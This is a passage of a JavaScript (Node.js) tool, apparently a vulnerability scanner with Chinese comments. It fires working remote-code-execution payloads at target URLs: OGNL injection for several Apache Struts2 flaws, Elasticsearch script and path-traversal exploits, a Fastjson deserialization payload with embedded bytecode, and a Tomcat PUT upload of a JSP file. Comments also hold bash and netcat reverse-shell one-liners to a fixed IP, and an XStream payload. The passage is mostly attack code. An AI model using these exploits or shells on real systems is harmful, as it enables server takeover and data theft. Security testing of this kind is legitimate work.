	  			fnDoBody(body,"s2-012",url);
	  		}
	    }
	  );
}
/*
Struts2 标签中 <s:a> 和 <s:url> 都包含一个 includeParams 属性，其值可设置为 none，
get 或 all，参考官方其对应意义如下：
none - 链接不包含请求的任意参数值（默认）
get - 链接只包含 GET 请求中的参数和其值
all - 链接包含 GET 和 POST 所有参数和其值
<s:a>用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。
   在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。
*/
function doStruts2_013(url, fnCbk)
{
	// encodeURIComponent(g_postData)
	var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
	+ ",#as=new java.lang.String()"
	+ ",#p.redirectErrorStream(true),#process=#p.start()"
	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
	+ ",#f.println(#as)"
	+ ",#f.flush()"
	+ ",#f.close()"
	+"}";
	this.name = this.name || "a";
	request(fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(s)
	    })
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-013,s2-014",url);
	  		}
	    }
	  );
	request(fnOptHeader({method: 'POST',uri: url,
		"formData":{"xt": s}
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-013,s2-014",url);
	  		}
	    }
	  );
}

/*
/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action
*/
function doStruts2_015(url, fnCbk)
{
	var fnC = function(szCmd,fnCbk1)
	{
		var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
		//////// 增加的关键行 start//////
		+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
		+ ",#f.setAccessible(true)"
		+ ",#f.set(#_memberAccess,true)"
		//////// 增加的关键行 end//////
		// + ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
		// + ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
		+ ",#p=new java.lang.ProcessBuilder('"+szCmd+"')"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
		// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",#as='{{'+#as+'}}'"
		+ ",#as.toString()"
		+"}";
		request(fnOptHeader({method: 'GET',uri: url + encodeURIComponent(s) + ".do"
		    })
		  , function (error, response, body){
		  	// console.log(error||body);
		  		if(body)
		  		{
		  			var r = /\{\{([^\}]+)\}\}/gmi.exec(body),sR = r && r[1] || "";
		  			fnCbk1(sR.replace(/(^\s*)|(\s*$)/gmi,''));
		  			// fnDoBody(body,"s2-015",url);
		  		}else fnCbk1('');
		    }
		  );
	};
	var a = g_szCmd.split(";"),aR = [],nC = 0;
	for(var i = 0; i < a.length; i++)
	{
		if(-1 < a[i].indexOf("echo")){nC++;continue;}
		(function(n)
		{
			fnC(a[n],function(s)
			{
				console.log(s);
				aR[n] = s;
				nC++;
			})
		})(i);
	}
	var nT = setInterval(function()
	{
		if(nC == a.length)
		{
			clearInterval(nT);
			// console.log("kkkk:" +aR.join('') + "kkk");
			fnDoBody(aR.join("\n"),"s2-015",url);
		}
	},13);
}

// /robots.txt
/*
 "action:", "redirect:", "redirectAction:" 
/default.action?redirect:
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
// bash -i >& /dev/tcp/192.168.24.90/4444 0>&1
// s2_016,s2_017
//////////*/
function doStruts2_016(url)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
		//////// 增加的关键行 start//////
		+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
		+ ",#f.setAccessible(true)"
		+ ",#f.set(#_memberAccess,true)"
		//////// 增加的关键行 end//////
		+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
		+ ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),#as=new java.lang.String(#e,0,#i)" 
		// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
		// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		//+ ",#as=(@java.net.URLEncoder@encode(#as,'UTF-8'))"
		// + ",#as='{{'+#as+'}}'"
		+ ",#as.toString()"
		+"}";
	var oR = fnOptHeader({method: 'GET',uri: url + "?redirectAction:" + encodeURIComponent(s)
		});
	oR.followAllRedirects = oR.followRedirect=true;
	request(oR,
    	function(e,r1,b)
    {
    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
    	// console.log(e || b);
    	if(!e)fnDoBody(e||b,"s2-016",szOldUrl);
    });
}

/*
一行反弹shell:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.24.90 4444 >/tmp/f
*/
function doStruts2_007(url, fnCbk)
{
	var s = "'+(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+")+'";
	this.name = this.name || "age";
	var oForm = {name:1,email:1};
	oForm[this.name] = s;
	request(fnOptHeader({method: 'POST',uri: url,//  + "?name=1&email=1&age=" + encodeURIComponent(s)
		"formData":oForm
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			body = body.replace(/\u0000/gmi, '');
	  			// console.log(body);
	  			fnDoBody(body,"s2-007",url);
	  		}
	    }
	  );
}

function doStruts2_008(url, fnCbk)
{
	var s = "(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
	+ ",#as=new java.lang.String()"
	+ ",#p.redirectErrorStream(true),#process=#p.start()"
	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+")";
	request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" + encodeURIComponent(s)
	    })
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-008",url);
	  		}
	    }
	  );
}

// Tomcat 8下导致RCE
function doStruts2_020(url, fnCbk)
{
	var a = [
		"?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
		"?class.classLoader.resources.context.parent.pipeline.first.prefix=shell",
		"?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
		"?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1",
		"?a=<%Runtime.getRuntime().exec(\"calc\");%>",
		"shell1.jsp"];
	request(fnOptHeader({method: 'GET',uri: url + "?a=" + encodeURIComponent(g_postData)
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-020",url);
	  		}
	    }
	  );
}

/* 暂未实现：
https://github.com/phith0n/vulhub/tree/master/elasticsearch/CVE-2015-5531
https://github.com/phith0n/vulhub/tree/master/elasticsearch/WooYun-2015-110216
////////*/
function elasticsearch(url,fnCbk,aData,t,urlr)
{
	var s = url, i = url.lastIndexOf('/',10), s1,s2,s4,s5,oData = 
		{
			"size":1,
			"query":
				{"filtered":
					{"query":
						{"match_all":""}
					}
				},
			"script_fields":
			{
				"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}
			}
		},
		szDes = "发现" + (t || 'CVE-2014-3120') + " elasticsearch漏洞" + (urlr || "https://github.com/phith0n/vulhub/tree/master/elasticsearch/CVE-2014-3120")
		,fnDRst = function(s)
		{
			if(s && -1 < s.indexOf("uid="))
			{
				g_oRst.elasticsearch || (g_oRst.elasticsearch = []);
				g_oRst.elasticsearch.push({des:szDes,r:s});
			}
		};
	if(0 < i)s = s.substr(0, i);
	s1 = s + "/_search?pretty";
	s4 = s + "/_plugin/head/../../../../../../../../../../../../../../../../../etc/passwd";
	request(fnOptHeader({method:"POST",uri:s1,headers:
	{
		"content-type": "application/x-www-form-urlencoded",
		"user-agent":g_szUa
	},body:aData||JSON.stringify(oData)}),function(e,r,b)
	{
		if(b && 200 == r.statusCode)
		{
			fnDRst(b);
		}
	});

	i = url.indexOf('/',10)
	if(0 < i)s = s.substr(0, i);
	s2 = s + "/_search?pretty";
	s5 = s + "/_plugin/head/../../../../../../../../../../../../../../../../../etc/passwd";
	if(s2 != s1)
	{
		request(fnOptHeader({method:"POST",uri:s2,headers:
		{
			"content-type": "application/x-www-form-urlencoded","user-agent":g_szUa
		},body:aData||JSON.stringify(oData)}),function(e,r,b)
		{
			if(b && 200 == r.statusCode)
			{
				fnDRst(b);
			}
		});
	}
	if(!aData)
	{
		elasticsearch(url,null,'{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}','CVE-2015-3120','https://github.com/phith0n/vulhub/tree/master/elasticsearch/CVE-2015-1427');
		var fnCbk1 = null;
		request(fnOptHeader({method:"GET",uri:s4}),fnCbk1 = function(e,r,b)
		{
			if(b && 200 == r.statusCode)
			{
				if(-1 < b.indexOf("root:"))
					g_oRst.elasticsearch.push({"des":"发现CVE-2015-3337漏洞，https://github.com/phith0n/vulhub/tree/master/elasticsearch/CVE-2015-3337"});
			}
		});
		if(s4 != s5)request(fnOptHeader({method:"GET",uri:s5}),fnCbk1);
	}
}

// weblogic uddiexplorer测试
function testWeblogic(url,fnCbk)
{
	var s = url, i = url.indexOf('/',10), szCs,szCs2;
	if(0 < i)s = s.substr(0, i);
	szCs = s + "/console/"
	szCs2 = s + "/manager/"
	
	s += "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001";
	// console.log(s)
	request(fnOptHeader({method:"GET",uri:s}),function(e,r,b)
	{
		if(b && 200 == r.statusCode && -1 < b.indexOf("weblogic.uddi.client"))
		{
			g_oRst.weblogic = {uddiexplorer:"发现uddiexplorer可访问，且存在SSRF漏洞，建议将/uddiexplorer加入访问黑名单中"};
		}

	});
	request(fnOptHeader({method:"GET",uri:szCs}),function(e,r,b)
	{
		if(r && 200 == r.statusCode)
		{
			g_oRst.weblogic = {console:"发现console可访问，不符合安全规范要求，建议关闭、设置访问限制，建议将/console 加入访问黑名单中"};
		}
	});
	request(fnOptHeader({method:"GET",uri:szCs2}),function(e,r,b)
	{
		if(r && 200 == r.statusCode && -1 < String(b).indexOf("manager"))
		{
			g_oRst.tomcat = {console:"发现manager可访问，不符合安全规范要求，建议关闭、设置访问限制，建议将/manager加入访问黑名单中"};
		}
	});
}

/*
POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/xml
Content-Length: 1663
Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit
Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7
Connection: close
Upgrade-Insecure-Requests: 1

<map> 
<entry> 
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
</entry> 
</map> 
https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-052
*/
function doStruts2_052(url)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	var s = "";
	var oR = fnOptHeader({method: 'GET',uri: url + "?redirectAction:" + encodeURIComponent(s)
		});
	oR.followAllRedirects = oR.followRedirect=true;
	request(oR,
    	function(e,r1,b)
    {
    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
    	// console.log(e || b);
    	if(!e)fnDoBody(e||b,"s2-052",szOldUrl);
    });
}
function doStruts2_053(url)
{
	var szOldUrl = url;
	this.name = this.name || "name";
	// console.log(this.name);
	url = fnNotEnd(url);
	var s = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
	var oR = fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(s)
		});
	oR.followAllRedirects = oR.followRedirect=true;
	request(oR,
    	function(e,r1,b)
    {
    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
    	// console.log(e || b);
    	if(!e)fnDoBody(e||b,"s2-053",szOldUrl);
    });
}

// fast json漏洞确认
function fastjson(url, fnCbk)
{
	request(fnOptHeader(
		{method: 'POST',
		uri: url
		,body:'{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADIAqQcAAgEADXdob2FtaS9XaG9hbWkHAAQBABBqYXZhL2xhbmcvT2JqZWN0AQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlCgABAAkMAAoABgEABnNldENtZAEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABjxpbml0PgoAAwAPDAANAAYBAAR0aGlzAQAPTHdob2FtaS9XaG9hbWk7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwgAFwEAB29zLm5hbWUKABkAGwcAGgEAEGphdmEvbGFuZy9TeXN0ZW0MABwAHQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsKAB8AIQcAIAEAEGphdmEvbGFuZy9TdHJpbmcMACIAIwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsIACUBAAd3aW5kb3dzCgAfACcMACgAKQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCAArAQAHY21kLmV4ZQgALQEAAi9jCAAvAQA8ZWNobyB3aG9hbWk6ICYmIHdob2FtaSAmJiBlY2hvIHB3ZDogJiYgZWNobyAlY2QlICYmIGVjaG8gZW5kCAAxAQAFbGludXgIADMBAAcvYmluL3NoCAA1AQACLWMIADcBACplY2hvIHdob2FtaTo7d2hvYW1pO2VjaG8gcHdkOjtwd2Q7ZWNobyBlbmQJABkAOQwAOgA7AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07BwA9AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIIAD8BAEbojrflj5bns7vnu5/lj4LmlbDlh7rplJnvvIzpnZ5XaW5kb3dz5oiWTGludXjvvIEg6I635Y+W5Yiw55qE5YC85Li677yaCgA8AEEMAA0AQgEAFShMamF2YS9sYW5nL1N0cmluZzspVgoAPABEDABFAEYBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsKADwASAwASQAjAQAIdG9TdHJpbmcKAEsATQcATAEAE2phdmEvaW8vUHJpbnRTdHJlYW0MAE4AQgEAB3ByaW50bG4KAAEAUAwAUQBSAQAFZG9DbWQBACcoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAJvcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA2NtZAEABnJlc3VsdAEADVN0YWNrTWFwVGFibGUHABUHAFoBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyCgBZAA8KAF0AXwcAXgEAEWphdmEvbGFuZy9SdW50aW1lDABgAGEBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBdAGMMAGQAZQEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBnAGkHAGgBABFqYXZhL2xhbmcvUHJvY2VzcwwAagBrAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwcAbQEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIKAGwAbwwADQBwAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWBwByAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgoAcQB0DAANAHUBABMoTGphdmEvaW8vUmVhZGVyOylWCgAfAHcMAHgAeQEAB3ZhbHVlT2YBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwgAewEADmxpbmUuc2VwYXJhdG9yCgBZAH0MAEUAfgEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7CgBxAIAMAIEAIwEACHJlYWRMaW5lCgCDAIUHAIQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACGAAYBAA9wcmludFN0YWNrVHJhY2UKAIgAigcAiQEAE2phdmEvaW8vSW5wdXRTdHJlYW0MAIsABgEABWNsb3NlCgBsAIoKAHEAigoAZwCPDACQAAYBAAdkZXN0cm95CgCSAIUHAJMBABNqYXZhL2lvL0lPRXhjZXB0aW9uCgBZAEgBAAJwcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAAmlzAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAJydAEAE0xqYXZhL2xhbmcvUnVudGltZTsBAARsaW5lAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwcApgEAE2phdmEvbGFuZy9UaHJvd2FibGUBAApTb3VyY2VGaWxlAQALV2hvYW1pLmphdmEAIQABAAMAAAAAAAUACAAFAAYAAQAHAAAAKAAAAAAAAAAEuAAIsQAAAAIACwAAAAoAAgAAAA8AAwAQAAwAAAACAAAAAQANAAYAAQAHAAAALwABAAEAAAAFKrcADrEAAAACAAsAAAAGAAEAAAAMAAwAAAAMAAEAAAAFABAAEQAAAAkAEgATAAEABwAAADIAAAABAAAABLgACLEAAAACAAsAAAAKAAIAAAATAAMAFAAMAAAADAABAAAABAAUABUAAAAJAAoABgABAAcAAAD9AAQAAwAAAHASFrgAGLYAHksGvQAfTCrGAB4qEiS2ACaZABUrAxIqUysEEixTKwUSLlOnADkqxgAeKhIwtgAmmQAVKwMSMlMrBBI0UysFEjZTpwAasgA4uwA8WRI+twBAKrYAQ7YAR7YASrEruABPTbIAOCy2AEqxAAAAAwALAAAAQgAQAAAAGgAJABsADgAcABsAHgAgAB8AJQAgACoAIQA6ACMAPwAkAEQAJQBJACYATAAnAGIAKABjACoAaAArAG8ALAAMAAAAIAADAAkAZwBTAFQAAAAOAGIAVQAVAAEAaAAIAFYAVAACAFcAAAANAAP9AC0HAB8HAFgeFgAJAFEAUgABAAcAAAMaAAQACgAAAP0BTAFNAU4BOgS7AFlZtwBbOgW4AFw6BhkGKrYAYkwrtgBmOgS7AGxZGQS3AG5NuwBxWSy3AHNOpwAgGQW7ADxZGQe4AHa3AEASergAGLYAQ7YAR7YAfFcttgB/WToHx//cpwBqOgYZBrYAghkExgAIGQS2AIcsxgAHLLYAjC3GAActtgCNK8YAcSu2AI6nAGo6CRkJtgCRpwBgOggZBMYACBkEtgCHLMYAByy2AIwtxgAHLbYAjSvGABErtgCOpwAKOgkZCbYAkRkIvxkExgAIGQS2AIcsxgAHLLYAjC3GAActtgCNK8YAESu2AI6nAAo6CRkJtgCRGQW2AJSwAAUAEgBhAGQAgwBrAI0AkACSABIAawCaAAAAnAC+AMEAkgDLAO0A8ACSAAMACwAAAMIAMAAAADQAAgA1AAQANgAGADcACQA4ABIAOgAXADsAHgA8ACQAPQAuAD4ANwBAADoAQQBXAEAAYQBDAGYARABrAEcAcABIAHUASQB5AEoAfQBLAIEATACFAE4AiQBPAI0AUACSAFEAmgBFAJwARwChAEgApgBJAKoASgCuAEsAsgBMALYATgC6AE8AvgBQAMMAUQDIAFMAywBHANAASADVAEkA2QBKAN0ASwDhAEwA5QBOAOkATwDtAFAA8gBRAPcAVAAMAAAAhAANAAAA/QBVABUAAAACAPsAlQCWAAEABAD5AJcAmAACAAYA9wCZAJoAAwAJAPQAmwCcAAQAEgDrAJ0AngAFABcASgCfAKAABgA6AB0AoQBUAAcAXgADAKEAVAAHAGYABQCiAKMABgCSAAUAogCkAAkAwwAFAKIApAAJAPIABQCiAKQACQBXAAAAkQAT/wA6AAgHAFgHAGcHAGwHAHEHAIgHAFkHAF0HAB8AAPoAHP8ADAAGBwBYBwBnBwBsBwBxBwCIBwBZAAEHAIMQBwdKBwCSSQcApf8ACwAJBwBYBwBnBwBsBwBxBwCIBwBZAAAHAKUAAAcHSgcAkgb/AAIABgcAWAcAZwcAbAcAcQcAiAcAWQAACQcHSgcAkgYAAQCnAAAAAgCo"],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}'
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"xml/JSON"
	    }})
	  , function (error, response, body){
	  		//console.log(error || body);
	  		if(body)
	  		{
	  			fnDoBody(body,"fastjson");
	  		}
	    }
	  );
}

/*
CVE-2017-12616 poc
1、/conf/web.xml
 <init-param>
            <param-name>readonly</param-name>
            <param-value>false</param-value>
        </init-param>
2、http://............../
curl -X PUT "http://127.0.0.1:8080/123.jsp/" -d '<%out.println("test");%>'
http://127.0.0.1:8080/123.jsp
*/
var szCode = fs.readFileSync(__dirname + "/bak.jsp").toString();
function fnMyPut(url)
{
	var szOld = url.substr(0, url.indexOf("/",10));
	var aUrls = [url.substr(0, url.lastIndexOf('/') + 1),szOld,szOld + "/examples/",szOld + "/manager/"];
	var fnTmpFc = function(url)
	{
		var a = ["bak.jsp%20","bak.jsp/","bak.jsp%00","bak.jsp"];
		var fnPt = function(u)
		{
			request.put({"uri":u,"body":szCode},function(e,r,b)
			{
				if(e);//console.log(e);
				// console.log([u,r.statusCode,r.headers["location"],e||b]);
				else if(r && (201 == r.statusCode || 204 == r.statusCode))
				{
					var oT = g_oRst["tomcat"] || {};
					oT["CVE-2017-12616"] = "发现高危put CVE-2017-12616漏洞,可访" + u + "问进行测试";
					console.log(oT["CVE-2017-12616"]);
					g_oRst["tomcat"] = oT;
				}
			});
		};
		for(var k in a)
			fnPt(url + a[k]);	
	};
	for(var k in aUrls)
	{
		fnTmpFc(aUrls[k]);
	}
}

// https://github.com/Medicean/VulApps/tree/master/s/struts2
function fnTestStruts2(szUrl2, obj)
{
	var a = [doStruts2_001,doStruts2_007,doStruts2_009,doStruts2_012,doStruts2_013,doStruts2_029,doStruts2_048,doStruts2_053], fnGetCpy = function()
	{
		var o = {name:null};
		if(!obj)return o;
		for(var k in obj)o[k] = obj[k];
		return o;
	};
	
	if(obj)
	for(var k in a)
	{
		a[k].call(fnGetCpy(),szUrl2);
	}
